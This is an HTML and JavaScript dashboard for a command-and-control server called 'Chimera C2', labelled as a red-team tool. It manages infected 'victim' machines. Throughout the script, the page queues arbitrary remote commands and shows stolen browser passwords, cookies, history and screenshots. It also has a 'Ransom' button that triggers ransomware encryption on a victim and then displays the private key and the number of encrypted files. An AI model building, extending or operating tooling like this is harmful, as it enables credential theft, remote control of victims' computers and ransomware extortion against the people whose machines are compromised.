<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chimera C2 – RedTeam Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        /* ============================================================
           CSS VARIABLES & RESET
           ============================================================ */
        :root {
            --bg-primary: #0b0e1a;
            --bg-card: #141a2b;
            --bg-card-hover: #1a2238;
            --border-color: #2a2f4a;
            --text-primary: #e8edf5;
            --text-secondary: #8892b0;
            --text-muted: #4a5568;

            --green: #00ff88;
            --green-dim: rgba(0, 255, 136, 0.15);
            --red: #ff0044;
            --red-dim: rgba(255, 0, 68, 0.15);
            --orange: #ffaa00;
            --orange-dim: rgba(255, 170, 0, 0.15);
            --blue: #00b4ff;
            --blue-dim: rgba(0, 180, 255, 0.15);
            --purple: #a855f7;
            --yellow: #ffd700;

            --radius: 12px;
            --shadow: 0 8px 32px rgba(0,0,0,0.6);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: var(--bg-primary);
            color: var(--text-primary);
            padding: 20px;
            min-height: 100vh;
            background-image: radial-gradient(circle at 20% 50%, rgba(0,255,136,0.03) 0%, transparent 60%);
        }

        /* ============================================================
           HEADER
           ============================================================ */
        .header {
            background: linear-gradient(135deg, #141a2b, #0b0e1a);
            padding: 20px 30px;
            border-radius: var(--radius);
            border: 1px solid var(--border-color);
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
            margin-bottom: 25px;
            box-shadow: var(--shadow);
            position: relative;
            overflow: hidden;
        }
        .header::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--green), transparent);
            opacity: 0.5;
        }
        .brand h1 {
            font-size: 28px;
            font-weight: 800;
            background: linear-gradient(90deg, var(--green), #00cc66);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: -0.5px;
        }
        .brand .subtitle {
            font-size: 13px;
            color: var(--text-secondary);
            margin-top: 2px;
            letter-spacing: 1px;
        }
        .stats {
            display: flex;
            gap: 25px;
            flex-wrap: wrap;
        }
        .stat {
            text-align: center;
            min-width: 60px;
        }
        .stat .number {
            font-size: 24px;
            font-weight: 700;
            color: var(--green);
            line-height: 1.2;
        }
        .stat .label {
            font-size: 10px;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .stat .number.pending { color: var(--yellow); }
        .stat .number.active { color: var(--green); }
        .stat .number.data { color: var(--blue); }

        .refresh-time {
            font-size: 12px;
            color: var(--text-muted);
        }

        /* ============================================================
           VICTIM CARDS
           ============================================================ */
        .victim-card {
            background: var(--bg-card);
            border-radius: var(--radius);
            padding: 20px 25px;
            margin: 14px 0;
            border: 1px solid var(--border-color);
            transition: all 0.3s ease;
        }
        .victim-card:hover {
            border-color: var(--green);
            box-shadow: 0 0 30px rgba(0,255,136,0.05);
            background: var(--bg-card-hover);
        }
        .victim-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
            margin-bottom: 12px;
        }
        .victim-id {
            font-size: 18px;
            font-weight: 700;
            color: var(--green);
        }
        .victim-status {
            padding: 4px 14px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            background: var(--green-dim);
            color: var(--green);
            border: 1px solid rgba(0,255,136,0.3);
        }
        .victim-status.offline {
            background: var(--red-dim);
            color: var(--red);
            border-color: rgba(255,0,68,0.3);
        }

        .victim-details {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 6px 20px;
            margin: 10px 0;
            padding: 10px 0;
            border-top: 1px solid var(--border-color);
            border-bottom: 1px solid var(--border-color);
        }
        .detail {
            font-size: 13px;
            color: var(--text-secondary);
        }
        .detail span {
            color: var(--text-primary);
            font-weight: 500;
        }

        .command-box {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
            margin: 12px 0;
        }
        .command-box input {
            flex: 1;
            min-width: 200px;
            padding: 10px 16px;
            background: #0a0e1a;
            border: 1px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-primary);
            font-size: 14px;
            transition: 0.3s;
        }
        .command-box input:focus {
            outline: none;
            border-color: var(--green);
            box-shadow: 0 0 10px rgba(0,255,136,0.1);
        }

        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            transition: 0.3s;
        }
        .btn:hover { transform: scale(1.02); }
        .btn-go { background: var(--green); color: #0a0e1a; }
        .btn-go:hover { box-shadow: 0 0 20px rgba(0,255,136,0.2); }
        .btn-data { background: var(--blue); color: #0a0e1a; }
        .btn-data:hover { box-shadow: 0 0 20px rgba(0,180,255,0.2); }
        .btn-screenshot { background: var(--orange); color: #0a0e1a; }
        .btn-screenshot:hover { box-shadow: 0 0 20px rgba(255,170,0,0.2); }
        .btn-ransom { background: var(--red); color: #fff; }
        .btn-ransom:hover { box-shadow: 0 0 20px rgba(255,0,68,0.4); }

        /* ============================================================
           CONTENT PANEL – replaces tabs
           ============================================================ */
        .content-panel {
            margin-top: 12px;
            background: #0a0e1a;
            border-radius: var(--radius);
            border: 1px solid var(--border-color);
            padding: 15px;
            max-height: 350px;
            overflow-y: auto;
            display: none;
        }
        .content-panel.active {
            display: block;
        }
        .content-panel .section-title {
            font-weight: 600;
            color: var(--green);
            margin: 8px 0 4px 0;
            border-bottom: 1px solid var(--border-color);
            padding-bottom: 4px;
        }
        .content-panel .section-title:first-of-type {
            margin-top: 0;
        }
        .data-item {
            padding: 4px 0;
            border-bottom: 1px solid var(--border-color);
            font-size: 12px;
            color: var(--text-secondary);
            display: flex;
            gap: 10px;
            align-items: baseline;
        }
        .data-item .label {
            color: var(--text-muted);
            min-width: 100px;
            font-weight: 500;
        }
        .data-item .value {
            color: var(--text-primary);
            word-break: break-all;
        }
        .data-item .value.url { color: var(--blue); }
        .data-item .value.title { color: var(--yellow); }

        .screenshot-container {
            text-align: center;
            margin: 5px 0;
        }
        .screenshot-img {
            max-width: 100%;
            max-height: 400px;
            border-radius: 8px;
            border: 1px solid var(--border-color);
            box-shadow: 0 4px 20px rgba(0,0,0,0.4);
        }
        .screenshot-info {
            color: var(--text-muted);
            font-size: 11px;
            margin-top: 5px;
        }

        .key-display {
            background: #000;
            color: #0f0;
            padding: 8px;
            border-radius: 4px;
            font-family: monospace;
            font-size: 11px;
            word-break: break-all;
            max-height: 100px;
            overflow-y: auto;
            margin-top: 5px;
        }

        /* ============================================================
           LIVE STREAM
           ============================================================ */
        .live-stream {
            background: var(--bg-card);
            border-radius: var(--radius);
            padding: 15px 20px;
            margin-top: 25px;
            border: 1px solid var(--border-color);
            max-height: 150px;
            overflow-y: auto;
        }
        .live-stream .title {
            color: var(--text-muted);
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 10px;
        }
        .live-entry {
            padding: 4px 10px;
            border-bottom: 1px solid var(--border-color);
            font-size: 12px;
            color: var(--text-secondary);
            display: flex;
            gap: 15px;
            align-items: center;
        }
        .live-entry .time {
            color: var(--text-muted);
            font-size: 10px;
            min-width: 70px;
        }
        .live-entry .type {
            font-weight: 600;
            min-width: 80px;
            font-size: 11px;
        }
        .live-entry .type.screenshot { color: var(--orange); }
        .live-entry .type.command { color: var(--blue); }
        .live-entry .type.result { color: var(--green); }
        .live-entry .type.system { color: var(--text-muted); }
        .live-entry .type.ransom { color: var(--red); }

        .debug-info {
            color: var(--text-muted);
            font-size: 12px;
            margin-top: 15px;
            padding: 10px;
            background: #0a0e1a;
            border-radius: 8px;
            border: 1px solid var(--border-color);
        }
        .no-victims {
            text-align: center;
            padding: 60px 20px;
            color: var(--text-muted);
        }
        .no-victims .icon { font-size: 48px; margin-bottom: 15px; }

        .result {
            padding: 10px 14px;
            margin-top: 8px;
            border-radius: 8px;
            font-size: 13px;
            background: #0a0e1a;
            border-left: 3px solid var(--yellow);
            display: none;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            max-height: 200px;
            overflow-y: auto;
        }
        .result.visible { display: block; }
        .result.success { border-color: var(--green); color: var(--green); }
        .result.pending { border-color: var(--yellow); color: var(--yellow); }
        .result.error { border-color: var(--red); color: var(--red); }

        @media (max-width: 768px) {
            .header { flex-direction: column; text-align: center; }
            .stats { justify-content: center; }
            .command-box { flex-direction: column; }
            .command-box input { width: 100%; }
        }
    </style>
</head>
<body>

    <!-- ========== HEADER ========== -->
    <header class="header">
        <div class="brand">
            <h1> CHIMERA C2</h1>
            <div class="subtitle">RedTeam Command & Control Server</div>
        </div>
        <div class="stats">
            <div class="stat"><div class="number" id="total">0</div><div class="label">Total</div></div>
            <div class="stat"><div class="number active" id="active">0</div><div class="label">Active</div></div>
            <div class="stat"><div class="number pending" id="pending">0</div><div class="label">Pending</div></div>
            <div class="stat"><div class="number data" id="dataCount">0</div><div class="label">Data</div></div>
        </div>
        <div>
            <span class="refresh-time" id="refreshTime">Auto‑refresh: every 30s</span>
        </div>
    </header>

    <!-- ========== VICTIMS ========== -->
    <div id="victimsContainer"></div>

    <!-- ========== LIVE STREAM ========== -->
    <div class="live-stream" id="liveStream">
        <div class="title">📡 Live Events</div>
        <div class="live-entry" style="color:var(--text-muted);">Waiting for events...</div>
    </div>

    <!-- ========== DEBUG ========== -->
    <div class="debug-info" id="debugInfo">💡 Dashboard auto‑refreshes every 30 seconds.</div>

    <!-- ========== JAVASCRIPT ========== -->
    <script>
        // ================================================================
        //  UTILITY FUNCTIONS
        // ================================================================
        function formatDate(d) { if (!d) return 'Never'; try { return new Date(d).toLocaleString(); } catch(e) { return d; } }
        function formatDisks(j) { try { var disks = typeof j==='string' ? JSON.parse(j) : j; if (!Array.isArray(disks) || disks.length===0) return 'No disk info'; return disks.map(function(d){return d.mount+' ('+d.total+' total, '+d.free+' free)';}).join('; '); } catch(e){return 'Invalid disk data';} }

        function addLiveEntry(type, message) {
            var stream = document.getElementById('liveStream');
            var entry = document.createElement('div');
            entry.className = 'live-entry';
            var time = new Date().toLocaleTimeString();
            var typeClass = type || 'system';
            entry.innerHTML = '<span class="time">'+time+'</span><span class="type '+typeClass+'">'+typeClass.toUpperCase()+'</span><span>'+message+'</span>';
            stream.appendChild(entry);
            while (stream.children.length > 50) stream.removeChild(stream.children[1]);
            stream.scrollTop = stream.scrollHeight;
        }

        // ================================================================
        //  REFRESH & STATS (no manual refresh button)
        // ================================================================
        var victimsData = [];

        function refresh() {
            document.getElementById('debugInfo').textContent = '🔄 Loading...';
            document.getElementById('refreshTime').textContent = 'Auto‑refresh: ' + new Date().toLocaleTimeString();
            Promise.all([
                fetch('/api/victims').then(function(r){return r.json();}),
                fetch('/api/stats').then(function(r){return r.json();})
            ]).then(function(results) {
                var victims = results[0].victims || [];
                var stats = results[1];
                victimsData = victims;
                updateStats(victims, stats);
                renderVictims(victims);
                document.getElementById('debugInfo').textContent = '✅ Updated at ' + new Date().toLocaleTimeString();
                addLiveEntry('system', '🔄 Data refreshed');
            }).catch(function(e) {
                document.getElementById('debugInfo').textContent = '❌ Error: ' + e.message;
            });
        }

        function updateStats(victims, stats) {
            document.getElementById('total').textContent = victims.length;
            var active = victims.filter(function(v){return v.status==='active';}).length;
            document.getElementById('active').textContent = active;
            document.getElementById('pending').textContent = stats.pending_commands || 0;
            document.getElementById('dataCount').textContent = stats.total_data || 0;
        }

        // ================================================================
        //  RENDER VICTIMS (no tabs, only buttons + content panel)
        // ================================================================
        function renderVictims(victims) {
            var container = document.getElementById('victimsContainer');
            container.innerHTML = '';
            if (victims.length === 0) {
                container.innerHTML = '<div class="no-victims"><div class="icon">🕵️</div><h3>No Victims Connected</h3><p>Waiting for payloads to call home...</p></div>';
                return;
            }
            for (var i=0; i<victims.length; i++) {
                var v = victims[i];
                var vid = v.id;

                var card = document.createElement('div');
                card.className = 'victim-card';

                // Header
                var header = document.createElement('div');
                header.className = 'victim-header';
                header.innerHTML = '<span class="victim-id">🖥️ '+vid+'</span><span class="victim-status'+(v.status==='active'?'':' offline')+'">'+(v.status==='active'?'● ONLINE':'● OFFLINE')+'</span>';
                card.appendChild(header);

                // Details (static)
                var details = document.createElement('div');
                details.className = 'victim-details';
                var fields = [
                    ['Hostname', v.hostname],
                    ['IP', v.ip],
                    ['MAC', v.mac],
                    ['OS', v.os],
                    ['Arch', v.architecture],
                    ['CPU', v.cpu],
                    ['RAM', v.memory],
                    ['User', v.username],
                    ['Domain', v.domain]
                ];
                for (var f=0; f<fields.length; f++) {
                    var div = document.createElement('div');
                    div.className = 'detail';
                    div.innerHTML = fields[f][0]+': <span>'+(fields[f][1]||'Unknown')+'</span>';
                    details.appendChild(div);
                }
                var last = document.createElement('div');
                last.className = 'detail';
                last.style.gridColumn='1/-1'; last.style.color='var(--text-muted)'; last.style.fontSize='11px';
                last.textContent = 'First: '+formatDate(v.first_seen)+' | Last: '+formatDate(v.last_seen);
                details.appendChild(last);
                card.appendChild(details);

                // Command box
                var cmdBox = document.createElement('div');
                cmdBox.className = 'command-box';
                var input = document.createElement('input');
                input.type = 'text';
                input.id = 'cmd_'+vid;
                input.placeholder = 'Enter command...';
                input.onkeypress = function(id, e) { if (e.key==='Enter') executeCommand(id); }.bind(null, vid);
                cmdBox.appendChild(input);
                var btnRun = document.createElement('button');
                btnRun.className = 'btn btn-go';
                btnRun.textContent = '▶ Run';
                btnRun.onclick = function(id){ return function(){ executeCommand(id); }; }(vid);
                cmdBox.appendChild(btnRun);
                var btnData = document.createElement('button');
                btnData.className = 'btn btn-data';
                btnData.textContent = '📁 Data';
                btnData.onclick = function(id){ return function(){ loadData(id); }; }(vid);
                cmdBox.appendChild(btnData);
                var btnShot = document.createElement('button');
                btnShot.className = 'btn btn-screenshot';
                btnShot.textContent = '📸 Screenshot';
                btnShot.onclick = function(id){ return function(){ loadScreenshot(id); }; }(vid);
                cmdBox.appendChild(btnShot);
                var btnRansom = document.createElement('button');
                btnRansom.className = 'btn btn-ransom';
                btnRansom.textContent = '💀 Ransom';
                btnRansom.onclick = function(id){ return function(){ triggerRansomware(id); }; }(vid);
                cmdBox.appendChild(btnRansom);
                card.appendChild(cmdBox);

                // Result area (for command output)
                var result = document.createElement('div');
                result.id = 'result_'+vid;
                result.className = 'result';
                card.appendChild(result);

                // Content panel – replaces tabs, shows data, screenshot, ransomware status
                var panel = document.createElement('div');
                panel.className = 'content-panel';
                panel.id = 'panel_'+vid;
                panel.innerHTML = '<div style="color:var(--text-muted);padding:10px;text-align:center;">Click a button to load data.</div>';
                card.appendChild(panel);

                container.appendChild(card);
            }
        }

        // ================================================================
        //  LOAD DATA (system, browser, commands) into the panel
        // ================================================================
        function loadData(vid) {
            var panel = document.getElementById('panel_'+vid);
            var res = document.getElementById('result_'+vid);
            res.textContent = '📁 Loading data...';
            res.className = 'result visible pending';
            panel.innerHTML = '';

            fetch('/api/victim/'+vid).then(function(r){return r.json();}).then(function(data){
                if (data.error) {
                    res.textContent='❌ Error: '+data.error;
                    res.className='result visible error';
                    return;
                }
                res.textContent = '✅ Data loaded';
                res.className = 'result visible success';
                addLiveEntry('system', '📁 Data loaded for '+vid);

                var html = '';

                // ---- System info ----
                var sysData = data.data.find(function(d){return d.type==='system_info';});
                if (sysData) {
                    var c = sysData.content;
                    html += '<div class="section-title">🖥️ System Information</div>';
                    html += '<div class="data-item"><span class="label">OS</span><span class="value">'+c.os+' '+c.os_version+'</span></div>';
                    html += '<div class="data-item"><span class="label">Arch</span><span class="value">'+c.architecture+'</span></div>';
                    html += '<div class="data-item"><span class="label">CPU</span><span class="value">'+c.cpu+'</span></div>';
                    html += '<div class="data-item"><span class="label">RAM</span><span class="value">'+c.memory+'</span></div>';
                    html += '<div class="data-item"><span class="label">Disks</span><span class="value">'+formatDisks(c.disks)+'</span></div>';
                }

                // ---- Browser data ----
                var brData = data.data.find(function(d){return d.type==='browser_data';});
                if (brData) {
                    var bc = brData.content;
                    html += '<div class="section-title">🌐 Browser Data</div>';
                    if (bc.passwords && bc.passwords.length) {
                        html += '<div style="color:var(--orange);font-weight:600;margin:8px 0 4px;">🔑 Passwords ('+bc.passwords.length+')</div>';
                        bc.passwords.slice(0,5).forEach(function(p){ html += '<div class="data-item"><span class="label">'+p.url+'</span><span class="value">'+p.username+':'+p.password+'</span></div>'; });
                    }
                    if (bc.cookies && bc.cookies.length) {
                        html += '<div style="color:var(--yellow);font-weight:600;margin:8px 0 4px;">🍪 Cookies ('+bc.cookies.length+')</div>';
                        bc.cookies.slice(0,5).forEach(function(c){ html += '<div class="data-item"><span class="label">'+c.domain+'</span><span class="value">'+c.name+'='+c.value+'</span></div>'; });
                    }
                    if (bc.history && bc.history.length) {
                        html += '<div style="color:var(--blue);font-weight:600;margin:8px 0 4px;">📜 History ('+bc.history.length+')</div>';
                        bc.history.slice(0,5).forEach(function(h){ html += '<div class="data-item"><span class="label">'+h.title+'</span><span class="value url">'+h.url+'</span></div>'; });
                    }
                    if (!html.includes('Passwords') && !html.includes('Cookies') && !html.includes('History')) {
                        html += '<div style="color:var(--text-muted);">No browser data found.</div>';
                    }
                }

                // ---- Commands history ----
                html += '<div class="section-title">⌨️ Command History</div>';
                if (data.commands && data.commands.length) {
                    data.commands.forEach(function(c){
                        var resultText = '';
                        if (c.result && c.result !== '{}') {
                            try { var parsed = JSON.parse(c.result); resultText = ' → '+parsed; } catch(e) { resultText = ' → '+c.result; }
                        }
                        html += '<div class="data-item"><span class="label">'+formatDate(c.issued_at)+'</span><span class="value" style="color:'+(c.status==='executed'?'var(--green)':'var(--yellow)')+';">'+c.command+'</span><span style="color:var(--text-muted);font-size:11px;">'+c.status+resultText+'</span></div>';
                    });
                } else {
                    html += '<div style="color:var(--text-muted);padding:4px 0;">No commands executed.</div>';
                }

                // ---- Victim info (quick summary) ----
                var v = data.victim;
                html += '<div class="section-title">📋 Victim Summary</div>';
                html += '<div class="data-item"><span class="label">ID</span><span class="value">'+v.id+'</span></div>';
                html += '<div class="data-item"><span class="label">Hostname</span><span class="value">'+v.hostname+'</span></div>';
                html += '<div class="data-item"><span class="label">IP</span><span class="value">'+v.ip+'</span></div>';
                html += '<div class="data-item"><span class="label">Status</span><span class="value">'+v.status+'</span></div>';

                panel.innerHTML = html;
                panel.classList.add('active');
            }).catch(function(e){
                res.textContent='❌ Error: '+e.message;
                res.className='result visible error';
                panel.innerHTML = '<div style="color:var(--text-muted);padding:10px;">Error loading data.</div>';
            });
        }

        // ================================================================
        //  LOAD SCREENSHOT
        // ================================================================
        function loadScreenshot(vid) {
            var panel = document.getElementById('panel_'+vid);
            var res = document.getElementById('result_'+vid);
            res.textContent = '📸 Loading screenshot...';
            res.className = 'result visible pending';
            panel.innerHTML = '';

            fetch('/api/victim/'+vid).then(function(r){return r.json();}).then(function(data){
                if (data.error) {
                    res.textContent='❌ Error: '+data.error;
                    res.className='result visible error';
                    return;
                }
                var shot = data.data.find(function(d){return d.type==='screenshot';});
                if (shot && shot.content && shot.content.image) {
                    var imgSrc = 'data:image/png;base64,' + shot.content.image;
                    panel.innerHTML = '<div class="screenshot-container"><img class="screenshot-img" src="'+imgSrc+'" alt="Screenshot" /><div class="screenshot-info">Taken: '+formatDate(shot.timestamp)+'</div></div>';
                    panel.classList.add('active');
                    res.textContent = '✅ Screenshot loaded';
                    res.className = 'result visible success';
                    addLiveEntry('screenshot', '📸 Screenshot loaded for '+vid);
                } else {
                    panel.innerHTML = '<div style="color:var(--text-muted);padding:10px;">No screenshot available.</div>';
                    panel.classList.add('active');
                    res.textContent = '⚠️ No screenshot found';
                    res.className = 'result visible error';
                }
            }).catch(function(e){
                res.textContent='❌ Error: '+e.message;
                res.className='result visible error';
                panel.innerHTML = '<div style="color:var(--text-muted);padding:10px;">Error loading screenshot.</div>';
            });
        }

        // ================================================================
        //  EXECUTE COMMAND (unchanged)
        // ================================================================
        function executeCommand(vid) {
            var input = document.getElementById('cmd_'+vid);
            var cmd = input.value.trim();
            if (!cmd) return;
            var res = document.getElementById('result_'+vid);
            res.textContent = '⏳ Sending command...';
            res.className = 'result visible pending';
            addLiveEntry('command', '⌨️ Command sent to '+vid+': '+cmd);

            fetch('/api/send_command', {
                method: 'POST',
                headers: {'Content-Type':'application/json'},
                body: JSON.stringify({victim_id:vid, command:cmd})
            }).then(function(r){return r.json();}).then(function(data){
                if (data.status==='queued') {
                    res.textContent = '✅ Command queued. Waiting for result...';
                    res.className = 'result visible success';
                    checkResult(vid, data.command_id);
                } else {
                    res.textContent = '❌ Error: '+(data.message||'Unknown');
                    res.className = 'result visible error';
                }
            }).catch(function(e){ res.textContent='❌ Error: '+e.message; res.className='result visible error'; });
        }

        function checkResult(vid, cid) {
            var attempts = 0;
            var maxAttempts = 20;
            var interval = setInterval(function() {
                attempts++;
                fetch('/api/victim/'+vid).then(function(r){return r.json();}).then(function(data){
                    if (data.error) return;
                    var cmd = data.commands.find(function(c){return c.id===cid;});
                    if (cmd && cmd.status==='executed') {
                        clearInterval(interval);
                        var res = document.getElementById('result_'+vid);
                        var resultText = '';
                        if (cmd.result && cmd.result !== '{}') {
                            try { var parsed = JSON.parse(cmd.result); resultText = parsed; } catch(e) { resultText = cmd.result; }
                        } else { resultText = 'No output'; }
                        res.textContent = '✅ Command executed. Result:\n'+resultText;
                        res.className = 'result visible success';
                        addLiveEntry('result', '✅ Command result for '+vid);
                        // Optionally reload data panel if it's open
                        var panel = document.getElementById('panel_'+vid);
                        if (panel.classList.contains('active')) {
                            loadData(vid);
                        }
                    } else if (attempts >= maxAttempts) {
                        clearInterval(interval);
                        var res = document.getElementById('result_'+vid);
                        res.textContent = '⏳ Still pending after 60s.';
                        res.className = 'result visible pending';
                    }
                }).catch(function(){});
            }, 3000);
        }

        // ================================================================
        //  RANSOMWARE
        // ================================================================
        function triggerRansomware(vid) {
            if (!confirm('⚠️ Start full ransomware encryption on '+vid+'? This will encrypt all files!')) return;
            var res = document.getElementById('result_'+vid);
            res.textContent = '💀 Sending START_RANSOMWARE...';
            res.className = 'result visible pending';
            addLiveEntry('ransom', '💀 Ransomware triggered on '+vid);

            fetch('/api/send_command', {
                method: 'POST',
                headers: {'Content-Type':'application/json'},
                body: JSON.stringify({victim_id:vid, command:'START_RANSOMWARE'})
            }).then(function(r){return r.json();}).then(function(data){
                if (data.status==='queued') {
                    res.textContent = '✅ Ransomware command sent!';
                    res.className = 'result visible success';
                    setTimeout(function(){ checkResult(vid, data.command_id); }, 10000);
                    setTimeout(function(){ loadRansomwareStatus(vid); }, 15000);
                } else {
                    res.textContent = '❌ Error: '+(data.message||'Unknown');
                    res.className = 'result visible error';
                }
            }).catch(function(e){ res.textContent='❌ Error: '+e.message; res.className='result visible error'; });
        }

        function loadRansomwareStatus(vid) {
            var panel = document.getElementById('panel_'+vid);
            panel.innerHTML = '🔄 Loading ransomware status...';
            panel.classList.add('active');

            fetch('/api/ransomware/'+vid).then(function(r){return r.json();}).then(function(data){
                if (data.exists) {
                    var rk = data.data;
                    panel.innerHTML =
                        '<div style="color:var(--red);font-weight:600;margin-bottom:10px;">💀 RANSOMWARE EXECUTED</div>'+
                        '<div class="data-item"><span class="label">Files Encrypted</span><span class="value" style="color:var(--yellow);font-size:16px;">'+rk.files_encrypted+'</span></div>'+
                        '<div class="data-item"><span class="label">Last Updated</span><span class="value">'+formatDate(rk.updated_at)+'</span></div>'+
                        '<div style="margin-top:15px;color:var(--yellow);font-weight:600;">🔑 Private Key</div>'+
                        '<div class="key-display">'+(rk.private_key||'Not received')+'</div>'+
                        '<div style="margin-top:10px;color:var(--yellow);font-weight:600;">🔐 HMAC Keys</div>'+
                        '<div class="key-display">'+JSON.stringify(rk.hmac_keys, null, 2)+'</div>';
                } else {
                    panel.innerHTML = '<div style="color:var(--text-muted);padding:10px;">No ransomware data yet. Use the 💀 Ransom button to start.</div>';
                }
            }).catch(function(e){
                panel.innerHTML = '❌ Error loading ransomware status';
            });
        }

        // ================================================================
        //  AUTO REFRESH (no manual button)
        // ================================================================
        function autoRefresh() { refresh(); setInterval(refresh, 30000); }

        // Polyfill .find for older browsers
        if (!Array.prototype.find) {
            Array.prototype.find = function(predicate) {
                if (this == null) throw new TypeError('Array.prototype.find called on null or undefined');
                if (typeof predicate !== 'function') throw new TypeError('predicate must be a function');
                var list = Object(this);
                var length = list.length >>> 0;
                var thisArg = arguments[1];
                for (var i = 0; i < length; i++) {
                    var value = list[i];
                    if (predicate.call(thisArg, value, i, list)) return value;
                }
                return undefined;
            };
        }

        autoRefresh();
    </script>
